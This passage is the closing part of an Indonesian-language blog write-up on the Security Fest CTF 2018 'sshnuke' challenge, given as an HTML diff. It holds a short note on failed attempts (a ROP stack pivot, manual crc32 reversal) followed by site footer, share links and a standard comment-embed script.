+<h2 id="Some-Failed-Attack-Ideas"><a href="#Some-Failed-Attack-Ideas" class="headerlink" title="Some Failed Attack Ideas"></a>Some Failed Attack Ideas</h2><p>Awalnya mau pakai teknik ROP dengan <code>stack pivot</code> tapi ternyata gadgets untuk mengontrol <code>sp</code> kurang bagus karena entah kenapa stack dan bss jadi berantakan. Sebelum pakai tools <code>reveng</code> untuk reverse crc32 perhitungan masih dilakukan secara manual, ini agak makan waktu banyak juga karena kalau buat database crc32 perlu space besar dan perhitungan manual itu perlu makan banyak waktu :(.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analisa"><span class="toc-number">1.</span> <span class="toc-text">Analisa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug"><span class="toc-number">2.</span> <span class="toc-text">Bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attacc"><span class="toc-number">3.</span> <span class="toc-text">Attacc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Final-Exploit"><span class="toc-number">4.</span> <span class="toc-text">Final Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Some-Failed-Attack-Ideas"><span class="toc-number">5.</span> <span class="toc-text">Some Failed Attack Ideas</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&text=Security Fest CTF 2018 - sshnuke"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&is_video=false&description=Security Fest CTF 2018 - sshnuke"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Security Fest CTF 2018 - sshnuke&body=Check out this article: https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&title=Security Fest CTF 2018 - sshnuke"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2018/06/02/Security-Fest-CTF-2018-sshnuke/&name=Security Fest CTF 2018 - sshnuke&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 zeroload
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zeroload-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
